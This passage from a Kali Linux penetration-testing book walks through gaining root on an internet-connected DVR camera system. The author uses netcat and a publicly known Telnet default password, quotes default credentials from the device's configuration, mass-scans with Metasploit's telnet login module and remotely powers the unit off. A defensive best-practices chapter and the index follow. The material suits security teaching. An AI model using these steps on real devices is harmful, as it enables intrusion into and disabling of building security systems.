 To install type: apt-get install iphone-backup-analyzer

 To run type, “iphone-backup-analyzer”:

![](Images/image01143.jpeg)

It seems that this tool only works with actual iPhone backups in iTunes, not forensics phone images. So you will need access to the actual backup to use this utility. The tool returns text messages, images, contact information all information that could be of great interest to both a forensics examiner and a security tester.

Conclusion

There can be a lot of overlap of important information between the security and forensics fields. In this section we took a final look at forensics tools that could be used for security testing.

Resources

 Kali Forensic Tools - [http://tools.kali.org/forensics](http://tools.kali.org/forensics)

# Internet of Things

## Chapter 34

## The Internet of Things

Online enabled devices or the “Internet of Things” as it is now being called is all the rage. Take that fancy hardware gizmo, add an embedded web server and you can view and control it from anywhere in the world – What a great idea! But sadly with the mad rush to make things more user friendly and convenient, security is being put aside, even in devices that are being used to protect important facilities.

Physical security devices are used to help secure important buildings, rooms, data or material. These hardware devices along with security personnel help defend a company from thieves & trespassers. They also protect employees, equipment and data.

These items include:

 Motion detectors

 Window & door alarms

 Smoke & fire detectors

 Security cameras

 Electronic locks

With the convenience of the internet and mobile devices, it just makes sense to give these devices an online interface so that they can be more easily monitored by reduced security staff, small business owners that are out of the office or home owners that are away on vacation.

But what if these devices themselves were not secure? Worse, what if these devices themselves were a security threat to your network? That is a good question, and there seems to be no good answer. Here are a few thoughts:

1.  The manufacturers don’t know how to secure the system.
2.  Security is not a priority to the manufacturer.
3.  They don’t have the staff to keep up on security issues.

Or even more concerning,

4.  The manufacturers might be doing it on purpose!

I recently ran into a very feature rich DVR security camera system that a small to medium size business would use. And as a bonus it was internet enabled so it could be monitored from anywhere or from any smart device. Just having this thing at your facility gave you the warm fuzzies. But with a little research I found that the device wasn’t secure at all.

The device was being run on a Local Area Network (LAN), but the manufacturer recommended that the device be allowed outside your firewall so it could be monitored from anywhere via smart devices. And why not, it had all the surface hallmarks of security. Layers of passwords were needed to access the device, and you could even set up account access allowing some users guest viewing privileges and various levels of configuration access to manager or admin level employees.

This item seemed very secure, and why wouldn’t it be? It was a physical security device; it must also have very strong online protection. But a quick security test of the device (took about 15 minutes) painted a totally different picture. This chapter will be more of a read through than a step-by-step tutorial. Also, as this device is still being sold to the public, and I am not sure if they fixed the issues yet, I will not reveal the brand name and its digital identity will be altered. 

Basic Security Test

To test the video system, I first ran a standard nmap probe against the device and found that it had several open ports. A couple regular ports and several high level ports were open. This made sense as it would need some open ports to be able to be monitored and configured over the web. But the large number of open ports just didn’t seem right:

![](Images/image01144.jpeg)

I then ran a more in-depth nmap scan to determine what software and version numbers were running on the open ports:

nmap -v -A 192.168.1.130

From the returns, I could see that the device was running some pretty standard services. I picked the Telnet server software name and version that nmap displayed and did a quick Google search for exploits. Low and behold the Telnet server on this manufacturer’s device seemed to have used the same default password on all devices at one time. The post even listed the default password. But this article was from several years ago. There is no way that brand new devices would still use this password, or would they?

To be sure, I tried to connect to the Telnet service on the device using Netcat and the default password that I found. From a Kali Linux terminal prompt I started Netcat (or I could have just used Telnet) with the IP address and port of the device:

nc 192.168.1.130 23

It then prompted me for the username and password. I entered the ones that I found from the web:

host login: root
Password: ******

I then received this response:

![](Images/image01145.jpeg)

BusyBox is somewhat common on embedded devices and is called, “The Swiss Army Knife of Embedded Linux”. It has a very small footprint and includes only the commands that the device manufacturer wants to include at compile time.

Typing “help” returned this screen:

[![netcat embedded server](Images/image01146.jpeg)](https://cyberarms.files.wordpress.com/2014/06/netcat-embedded-server.png)

Not too many options for commands, though I did find more in the “sbin” directory. But surfing around the directory structure re-affirmed that many commands and directories that you would expect are just not there making it a bit harder to do things we would normally do.

IoT Network Interfaces

When I ran an “ifconfig” command to list the network interfaces I saw that “eth0” is on our 192.168.1.0 network, but there is also an “ether0:poe” interface that belongs to the 10.1.1.0 network, very interesting:

![](Images/image01147.jpeg)

“PoE” stands for Power over Ethernet. These devices communicate and get the power to work over the Ethernet cable. These must be the cameras. If we run PS we see there is a micro-DHCP (udhcpd) service running:

![](Images/image01148.jpeg)

The command above mentions a mount directory, if we go there, we can view the config file:

![](Images/image01149.jpeg)

The cameras should be in the 10.1.1.128-255 range. And sure enough when I pinged them from the device I got a response. What is interesting is that the client control software for this system tends to just show the last view recorded as a still image if the feed is interrupted. So I wonder what would happen if we just remotely turned off the eth0:poe network interface (ifconfig down) for the cameras from the command line? Think about that for a moment.

Passwords Galore

I did find several configuration files and poking through them revealed some interesting information, like this:

       INI_GROUP_NAME_ADMIN         = "admin";

        INI_GROUP_NAME_USER            = "user";

        INI_SYS_USER_ADMIN                 = "admin",

        INI_SYS_USER_ADMIN_PWD     = "admin",

        INI_SYS_USER_LOCAL                  = "user",

        INI_SYS_USER_LOCAL_PWD       = "user",

        INI_USER_USER_LOCAL               = "user",

        INI_USER_USER_LOCAL_PWD   = "user",

        INI_DEFAULT_USER_NAME        = "default",

        INI_DEFAULT_USER_PWD           = "tluafed"

Of course they are all simple passwords, you were expecting something else on a building security device? I looked around the file system for a bit, seeing that I could modify the system services, all due to the fact that the manufacturer used a simple (and publicly known) password. I could spend more time trying to figure out what else I could do, but in reality the “whoami” command told me all I really needed to know:

[![netcat embedded root](Images/image01150.jpeg)](https://cyberarms.files.wordpress.com/2014/06/netcat-embedded-root.png)

We do in fact have “root” or god level access rights to the device. Nice…

Good thing this device isn’t made to sit outside your firewall, because anyone could easily get root access to it. Oh, wait a minute, this IoT device is  meant to be outside your firewall! The password the manufacturer used to protect the root level account was not only publicly available; it was also a short simple password comprised of less than six lowercase letters! Even if I didn’t get the password off the internet, I could have brute forced it in a fairly short amount of time.

If a password like this is run through Kaspersky’s secure password checker, ([https://blog.kaspersky.com/password-check/](https://blog.kaspersky.com/password-check/)) it responds with a possible crack time of:

![](Images/image01151.jpeg)

Forty Six seconds! Enough time, it says, for a snail to crawl nine inches.

A quick view of the device user passwd file (cat /etc/passwd) showed that the developer created over 40 usernames on this small device. What is the chance that they used simple passwords for all of the other users too? Worse yet, the manufacturer was seemingly notified about the root password being publicly displayed over two years ago and still haven’t corrected the issue.

### Mass Exploiting the IoT Device

Instead of this just being a single test device. What if our target was a large corporation and used multiple devices like this. How could we find and access all of them? Let’s try the telnet login scanner that is built in to Metasploit. The Telnet Login scanner allows you to put in a username password combo, or use username/ password file lists and scan a network range looking for successful Telnet logins.

As you can see below, it easily scanned our network and found our camera system. It then created a telnet session with the credentials that we provided (Password is redacted):

![](Images/image01152.jpeg)

Set the options and run the scanner. We want it to scan the entire 192.168.1.0/24 range and try the credentials on every system in this range. This would simulate searching a large network for similar devices:

![](Images/image01153.jpeg)

You will see a lot of failed connections, but after a short while (be sure to set the threads to 254 or you will wait a long time!) you will see the successful login:

![](Images/image01154.jpeg)

If we show and connect to the session it found:

![](Images/image01155.jpeg)

And we are in!

The End Game

With just a quick security test we saw that this out of the box building security device was not very secure at all. As I have mentioned several times, if this device was placed outside the corporate firewall as it was intended to be, it would have been an easy target for hackers.

If they wanted to disable the cameras, they could have stopped the individual services controlling the camera systems, or if they wanted to they could just run one of these commands:

![](Images/image01156.jpeg)

Or this?

![](Images/image01157.jpeg)

But would something that simple really work? I mean could you really remotely power off a building security device? Sure does, here is a view of the DVR’s control screen after running the command above:

![E:\Screen Shot 2015-07-28 at 5.24.02 PM.png](Images/image01158.jpeg)

Instead of just turning the device off, I wonder what would happen if they formatted the drive? Of course you would lose all the stored video from the device, but I wonder if it would brick the device making it unusable all together? Again something to think about.

But it is inside my Firewall so it is Okay

You would think that this type of attack would only be possible if the attacker was on the same LAN as the device. If there is a firewall between the device and the outside world, then no one from the outside should be able to mess with the security device. Or so you would think.

The system I used in this chapter was from an American based company that used a re-branded Chinese device. One day the system just stopped working. I could see it, but the DVR software just no longer worked. I re-installed the software and tried it from several computers to no avail. I went round and round with their technical support. Then one day, it just started working. I again called their tech support and was told that the issue was fixed - They “updated the software” on THEIR WEBSERVER and this fixed the issue. I revealed to them that leaving themselves in the communication loop between the client software and the physical device was a serious concern, especially for a security device that sat behind a firewall!

I brought it to their attention multiple times that it did not make sense that a building security device would be down just because they were doing maintenance on a remote webserver. And I repeatedly asked why their needed to be constant contact between this device and their web server, instead of it being a standalone fully functional unit. I kept getting passed to other company employees and “managers”. This whole ordeal lasted about two weeks, but at each step I kept getting “reassured” by company reps that as long as the system was functioning, everything was okay – complete insanity!

Conclusion

I know that this section was very short, but hopefully I demonstrated that you cannot just blindly trust that internet enabled physical security devices or any IoT device, are properly secured by the manufacturer. It is scary too to think that this device in particular offered no way to change the default passwords to the underlying services that were exposed to the web, and that after more than two years from being publicly exposed, new devices were still being made with the same simple root password. Also it is trivial to find IoT devices of all kinds using the internet search engine Shodan. This is why it is imperative to test these devices for security just as you would for any network device that you attach to your network, or worse, put outside your firewall.

# Defending

## Chapter 35

## Network Defense and Conclusion

We spent a lot of time covering offensive security techniques in this book. We also briefly covered defending against these attacks in most chapters. We will wrap things up with a quick discussion on general good practices for securing your network systems.

We will briefly cover:

 Patches & Updates

 Firewalls and Intrusion Prevention Systems (IPS)

 Anti-Virus/ Network Security Programs

 Limiting Services & User Authority

 Use Script Blocking Programs

 Using Long Complex Passwords

 Network Security Monitoring

 Logging

 User Education

 Scanning your network

 And finally, using Offensive Security

Though no system can be guaranteed to be 100% secure, we can make our systems much tougher to compromise by using these techniques.

Patches & Updates

Use the latest versions of Operating Systems if it is at all possible. Using outdated Operating Systems in a network environment with internet connectivity is really not a good idea. If you are still using Windows XP, you need to update to at least Windows 7\. Microsoft’s Official support for Windows XP (and Office 2003) ended on April 8th, 2014\. This means it no longer receives security updates or support. Windows 10 has some nice new security features like auto detecting if your standard anti-virus was uninstalled or disabled and then automatically turning on Windows Defender. It also has the capability to deobfuscate malicious code, and then scan it through the Antimalware Scan Interface (AMSI).

Make sure your operating systems and all software is up to date. In addition, also make sure Adobe products, Java, and internet browsers are regularly patched, along with Office software.

Make sure the hardware firmware on all of your devices, especially internet facing devices (Routers, Switches, NAS, Cameras, Embedded Server Devices, etc.), are current and checked regularly.

If you are in a large corporate environment, never place complete trust in automated patching and updating management systems. Manually check important systems regularly. I have seen multiple corporate servers error out on automated critical service packs installs, yet the patch management server displayed that all servers updated without error.

Firewalls and IPS

Always use a firewall, do not attach any systems to a live internet connection without using one. Firewall your incoming internet connection and also make sure that each individual system is using a software firewall.

Create an Ingress and Egress Rules policy to monitor or control information entering and leaving your network. At the simplest level, block communication with nations that you will not be doing business with. More advanced systems will allow you to control what type of data and protocols are allowed to enter and leave your network.

Use a Web Application Firewall to protect web application servers. Though these do not guarantee that you will stop all malicious attacks against your web app. Application security experts highly recommend that your web apps are securely written and tested for exploit even when a WAF is in place. Intrusion Prevention Systems are great, they are even better when used in a Network Security Monitoring type system (see topic below).

Segmenting your network into zones is also a very effective measure to help prevent a hacker gaining access to your entire corporate network if one zone is compromised.

Anti-Virus/ Network Security Programs

Honestly, I am torn on Anti-Virus programs. Though they do stop many threats, in 20 years of computer support I have also seen them constantly bypassed. Any determined modern hacker is going to research your company to try to find out what Anti-Virus program you use. Then they will tailor their exploit code to bypass that brand of AV. If they can’t find out what you are running, they will go with one that bypasses most of the big named AVs.

Not all Anti-Viruses are created equal. Some AV/ Internet security programs have gotten very good at blocking scripting based threats which seem really popular. Do some homework and find out how the top anti-virus programs fare against current threats, and then pick one that best meets your company needs. 

Limit Services & Authority Levels

Turn off network services and protocols on servers and systems that are not needed. The less attack surface a server has the better. Microsoft has aided in this over the years by changing their server product to come with basically nothing running by default, you add services as needed.

Also, take old servers offline as soon as possible. Many times companies will leave an old server online, in case they need something from it, and over time it is either forgotten or not updated.  

Never let everyday users use elevated security credentials for non-administrative tasks. Heavily restrict “Root” and “Administrator” level use. On a Windows system it is almost trivial to escalate a compromised administrator account to the god-like “System” level account. This is much more difficult if the compromised account is just at “user” level.

System administrators should only use admin level accounts when performing administrative functions, then switch back to a non-admin account for normal computing functions.

Use Script Blocking Programs

Many modern online threats use some level of a scripting language. Use a script blocking program like the Mozilla Add On “NoScript”, by Giorgio Maone. It is an easy solution to block a lot of threats. NoScript blocks scripts from automatically running on any new website that you visit. It also makes it very easy to allow some scripts to run, or completely whitelist a website. NoScript also remembers your settings so scripts will be blocked or allowed automatically when you visit frequent sites.

I also like the Mozilla Add On “Ghostery”, by José María Signanini, and Felix Shnir. Ghostery allows you to block tracking scripts, analytics and unwanted advertising on websites. There have been multiple reported attacks where hackers were able to get ads with malware inserted into ad services on popular websites.

Finally, when practical enable privacy features in web browsers. Do not let them store passwords or history, and check to see if a program like “BleachBit” occasionally to clean out browser caches would work for your company.

Use Long Complex Passwords

This should go without saying, but use long complex passwords not only for your computer systems (and online devices!), but also all of your online accounts. The longer, and more complex your password is, the longer it will take for an attacker to crack it. Use a combination of Upper and Lowercase Letters, numbers and symbols.

Use a different password for each online account that you have, that way if one is compromised, the attacker will not be able to use it to gain access to other accounts you own. And always use multi-factor authentication when it is available.

Network Security Monitoring

I am a huge fan of Network Security Monitoring (NSM). If you run your own network and don’t know what that is, run out (don’t walk) and purchase “The Tao of Network Security Monitoring, Beyond Intrusion Detection”, by Richard Bejtlich.

Basically NSM is a system of capturing all of your network traffic, sometimes at multiple points in your network, and analyzing it for intrusions or anomalies. If you think that you can’t afford a NSM system, think again. One of the most commonly used one is free!

“Security Onion” created by Doug Burks ([http://blog.securityonion.net/](http://blog.securityonion.net/)), is an extremely capable and feature rich NSM that is completely free. All you need is a fairly decent computer to run it on, a network tap and at least two network cards. Security Onion allows you to capture network traffic and then analyzes it for issues and notifies you with alerts in a fairly easy to use interface.

Below are a couple screenshots of Security Onion in action. The first one shows a slew of alerts that are triggered when I tried to run Backtrack’s (the previous version of Kali) Autopwn against a system on the network:

![](Images/image01159.jpeg)

As you can see there are multiple warnings and alerts. The last line records 172 (CNT column) incidents of one alert!

Security Onion is also capable of capturing TOR use on your network. TOR is an anonymizing protocol that uses encrypted communication that is bounced around the world to help anonymize users. TOR can be used for good, but hackers also use TOR to hide their attacks.

Here is what happened why I used TOR on my test network monitored by Security Onion:

![](Images/image01160.jpeg)

Notice that multiple yellow “Known TOR Exit Node Traffic” alerts are raised.

Security Onion has a slew of features & tools, makes analyzing & tracking network traffic much easier, and has the capability to store all of your network traffic for analysis.

Logging

This is basically a continuation of the previous topic. Make sure security logging is enabled on critical switches, routers, firewalls and systems. Preferably have critical devices and systems send security logs to a syslog server so you can have a secondary copy of them (in case hackers wipe system logs) and to make incident response easier. This helps in tracking down malicious users and traffic across devices if the worst does happen. Many of the basic level firewall routers even include syslog capability now.

Educate your users

All of your “security in depth” is useless if your users allow malicious programs to run on your network. One of the most common ways hackers get into your internal network is when users run a malicious attachment from an e-mail or run a malicious script from a website.

Teach users to avoid opening unsolicited or suspicious attachments, or from visiting suspicious websites. Some companies have had success with putting up signs encouraging safe computer surfing techniques and reminders on using complex unique passwords on online accounts.

For more information, the US Computer Emergency Response Team (US CERT) has put together a great reference and alert site at [http://www.us-cert.gov/ncas/tips/](http://www.us-cert.gov/ncas/tips/).

Scan your Network

Scan your network for security issues before the bad guys do. Just using Shodan ([https://www.shodan.io/](https://www.shodan.io/)) will expose systems hanging out on your network that you may have forgotten. Large companies usually have many systems publicly available running outdated Operating Systems and Web software. Don’t forget to check for cameras, open devices and also printers that are giving out too much information like internal network information, SNMP strings and user accounts.

Also, use an open source (like OpenVas) or commercial security scanning system (like NESSUS) to scan your entire network for security issues. OpenVas comes pre-installed on Kali, there is somewhat of a process to get it working, but there are numerous tutorials online.

Learn Offensive Computer Security

Finally, learn about offensive computer security techniques like those presented in this book. We have covered the most basic techniques used in offensive system security. There are a ton of books and security training seminars out there. Learn pentesting techniques (using products like Kali) and then try out your skills out on tools like Metasploitable and Mutillidae.

Connect with your local OWASP chapter or other security groups in your area. Attend security conferences and make contacts in the security field. Many do not mind helping out when asked good questions. SANS has some great classes too.

And once trained and proficient, and with management’s permission, test the security of your network systems.

Conclusion

I just wanted to take a minute and thank you for reading my book. If you have any comments or suggestions, or just want to say“Hi!” please let me know, I would love to hear from you!

I can be reached at [Cyberarms@live.com](mailto:Cyberarms@live.com).

Also, please check out my Blog, cyberarms.wordpress.com and my  Twitter account, @Cyberarms for up to date computer security news and tutorials.

This project took quite a bit of time (I actually started it a year and a half ago and had it pretty much completed only to updated it when Kali 2.0 came out), but if the response is positive, I am planning on creating a third and final Kali book using advanced techniques.

Thanks again!

Best Regards,

Daniel Dieterle

Resources

 Choosing and Protecting Passwords - [http://www.us-cert.gov/ncas/tips/ST04-002](http://www.us-cert.gov/ncas/tips/ST04-002)

 Avoiding Social Engineering and Phishing - [http://www.us-cert.gov/ncas/tips/ST04-014](http://www.us-cert.gov/ncas/tips/ST04-014)

 Staying Safe on Social Network Sites - [http://www.us-cert.gov/ncas/tips/ST06-003](http://www.us-cert.gov/ncas/tips/ST06-003)

 Using Caution with Email Attachments - [http://www.us-cert.gov/ncas/tips/ST04-010](http://www.us-cert.gov/ncas/tips/ST04-010)

 Vulnerability Scanners - [http://sectools.org/tag/vuln-scanners/](http://sectools.org/tag/vuln-scanners/)

Index

A

Analyzing a Test Image · 438

Analyzing Memory using Volatility · 399

Analyzing Registry Keys · 403

Android Meterpreter Commands · 379

Android SDK · 13, 14, 344, 346, 355, 358, 361, 362, 364, 365, 374

Android Webview Exploit Tutorial · 382

Anti-Virus/ Network Security Programs · 467

Apache Webserver · 13

Applications Menu · 9

ARPspoof · 388

Automating Attacks with Burp Intruder and Compare · 244

Autopsy · 443

B

Basic SQL Injection · 236

BBQSQL · 294

Blind Boolean Injection · 265

BlindElephant · 295

Burp Comparer · 252

Burp Encoder/ Decoder · 243

Burp Suite · 11, 188, 226, 228, 253, 262, 266, 267, 281, 283

But it is inside my Firewall so it is Okay · 463

Bypass UAC · 40

Bypassing Anti-Virus · 89

C

Captive Portal · 395

Command Injection · 190

Command Line Tools · 10

Commercial Web App Scanners · 182

Connecting to an Emulated Android Device with ADB · 361

Creating a booby trapped APK file · 374

Creating a Hard Drive Image · 432

Cross-Site Scripting Framework (XSSF) · 274

D

dc3dd · 435

Digital Forensics Framework · 432

Dirb · 297

DirBuster · 299

Downloading Data · 381

DumpIt program · 400

Dumpzilla · 447

DVWA · 220, 221, 223, 256, 268, 282, 283, 284, 287, 288

E

Enabling Remote Desktop · 145

Enabling USB Debug Mode · 356

Ethical Hacking Issues · 2

Extundelete · 448

F

Facebook · 428

File Upload · 220

Fimap · 213

Firewalls and IPS · 467

Foremost · 449

Forensic Tools · 399

Forensics · 399

Forensics Commands · 443

FTP Brute Force Attack · 158

Fuzzing with ZAP · 176

G

Galleta · 450

Generating Shells in Meterpreter · 65

getsystem · 40, 42, 135

Getting a Remote Shell on Android using Metasploit · 373

Global Variables · 72

GoLismero · 303

guymager · 436

H

Hivedump · 404

HTTrack · 301

I

IDS Evasion and Advanced Scans · 166

Installing an App using ADB · 361

Installing Different Android Versions · 348

Installing Mutillidae · 29

Installing the Android SDK · 344

Installing Virtual Machines · 17

Intercepting Proxy · 226, 228, 232, 261, 327

Internet History & Cache · 409

Internet of Things · 454

ipconfig · 28

iPhone Backup Analyzer · 451

K

Kali 2 · 6

Kali Included Webshells · 290

L

LFI and RFI · 204

Limit Services & Authority Levels · 468

Local File Inclusion (LFI) · 204

Logging · 471

Long Complex Passwords · 469

lsa_dump · 43

M

Maintaining Access · 134

Maintaining Access on a Webserver · 147

Malware Analysis with Malfind · 417

Man in the Middle & Wi-Fi Attacks against Android · 387

Mana · 392

Man-in-the-Middle with ARPspoof · 388

Memory Dumps with PowerShell · 430

Metasploit Service or “Metsvc” · 149

Metasploitable 2 · 23

Meterpreter “Persistence” Script · 135

Mimikatz · 8, 15, 42, 44, 53, 119, 429, 430, 431

MitM · 10, 173, 387, 389, 396

Msfvenom · 8, 39, 54, 55, 68, 86, 87, 114, 131, 147, 361, 373, 385

Mutillidae Database Configuration Changes · 29

N

NAT · 20

Nessus · 11, 182, 183, 184, 185, 186, 188

Netcat Backdoor · 143

Network Defense and Conclusion · 466

Network Miner · 391

Network Security Monitoring · 469

Nikto · 305

Nishang · 9, 10, 121, 128, 129, 131

Nmap · 10, 153, 155, 156, 158, 159, 160, 161, 166, 167, 388, 389, 427

O

Obtaining a Memory Dump · 400

OpenSSL-Heartbleed - Scanning and Exploiting · 161

Outlook · 428

OWASP Top 10 Project · 190

OWASP ZAP · 10, 169, 171, 172, 175, 180, 299, 326

P

P0f · 310

packet analyzer · 391

Paros · 306

Password Hashes · 271

Patches & Updates · 466

Pentest Monkey’s Reverse Shell · 215

PenTesters Framework · 337

Persistent XSS with Burp · 258

phishing · 9, 67, 117, 120, 156, 302, 342

PHP Shell · 8, 9, 62, 85, 196

Php.ini Configuration Change · 30

PHP-Backdoor · 290

PHP-findsock-shell · 293

Phpinfo.php · 208

PHP-reverse-shell.php · 292

PHP-Simple Backdoor · 290

Plecost · 309

Portscan · 74

Post Modules · 96

PowerShell · 8, 9, 10, 15, 37, 38, 40, 48, 51, 52, 59, 67, 79, 80, 87, 100, 104, 105, 106, 107, 108, 109, 110, 112, 113, 114, 115, 117, 119, 120, 121, 122, 123, 124, 126, 127, 128, 129, 130, 131, 132, 133, 198, 199, 200, 201, 339, 399, 408, 410, 411, 413, 430

PowerSploit · 9, 10, 121, 122, 126, 129, 430, 431

Pulling Data from Outlook · 428

Pulling passwords using Procdump & Mimikatz · 429

Q

qsd-php-backdoor.php · 291

R

Railgun · 9, 96, 100, 102, 103, 104

Recovering Data from Word · 423

Recovering Facebook Conversations · 428

Recovering Password Hashes · 413

Reflective XSS · 256

Remote File Inclusion (RFI) · 209

Remote Shell from Command Injection · 195

Remote Shell from SQL Injection · 241

Resource Files · 8, 69, 72, 73

Rooting and ADB Usage · 364

Rouge Wi-Fi Router Attacks with Mana · 392

Ruby script · 74

Running Meterpreter Commands on Multiple Targets · 46

S

S4u_persistence - Scheduled Persistence · 139

Scan for Exploited Services · 160

Scanning Specific Ports · 156

Script Blocking Programs · 468

Security and Hints Level · 33

Security Testing Android Devices · 373

Sensepost’s Mana · 393

Session Switches · 46

Setting the Kali IP address · 21

Shellter · 9, 89, 90, 92, 93, 94

Skipfish · 312

SQL Map · 12, 264

SQLNinja · 314

SQLSUS · 316

Stageless Meterpreter Payloads · 39

Starting an Emulator · 349

Stored XSS and XSSF for the Win · 281

T

TCP Dump and Wireshark · 390

Timeliner · 417

Transports · 38, 150

Tunneling with XSSF · 280

U

Unicorn · 339

Uniscan, Uniscan-gui · 317

Upgrading · 14

urlsnarf · 389

UserAssist · 405

Using your own Smart Phone in Kali · 355

V

Vega · 319

Viewing Network Connections with Netscan · 408

Viewing Protected Databases · 365

Virustotal · 93

VMware Player · 7, 17, 18, 19, 23

VMWare Player · 17

VMWare tools · 23

VNC payload and injection modules · 150

Volatility · 15, 400, 401, 402, 403, 406, 409, 414, 415, 416, 417, 421, 422, 450

Vss_Persistence - Volume Shadow Copy Persistence · 141

W

W3af · 321

Web App Tools · 294

Web Delivery · 8, 9, 40, 50, 78, 81, 83, 84, 85, 87, 115, 123, 129, 131

Web Shells · 286

Webcam Commands · 378

WebScarab · 325

Webshag · 328

WebSlayer · 329

WebSploit · 331

Weevely · 286

Weevely Commands · 288

What is Rooting? · 364

WhatWeb · 332

When Things Go Bad · 4

Windows Gather User Credentials · 117

Wireshark · 14, 159, 166, 167, 279, 390, 397

Word Document · 15, 423

Word Document from Remote System · 423

WordPress · 161, 309, 334, 335

Workspaces · 11

WPScan · 334

X

XAMPP install · 31

XSS (Cross Site Scripting Attacks) with Burp · 255

XSSer · 335

Y

Yarascan · 412